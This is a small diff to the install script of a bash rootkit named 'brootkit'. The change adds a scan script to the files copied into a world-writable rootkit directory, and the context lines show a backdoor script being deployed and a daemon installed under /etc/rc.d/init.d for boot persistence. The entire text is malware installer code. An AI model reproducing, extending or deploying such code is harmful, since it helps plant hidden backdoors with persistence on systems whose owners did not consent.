@@ -18,7 +18,7 @@ function main()
 	mkdir -p $BR_ROOTKIT_PATH -m 0777
 	[ $? -eq 1 ] && exit && echo "mkdir $BR_ROOTKIT_PATH failed."
 
-	cp brootkit.sh br.conf br_config.sh bashbd.sh $BR_ROOTKIT_PATH
+	cp brootkit.sh br.conf br_config.sh bashbd.sh br_scan.sh $BR_ROOTKIT_PATH
 	[ $? -eq 1 ] && exit && echo "copy brootkit failed."
 
 	cp brdaemon.sh /etc/rc.d/init.d/brdaemon
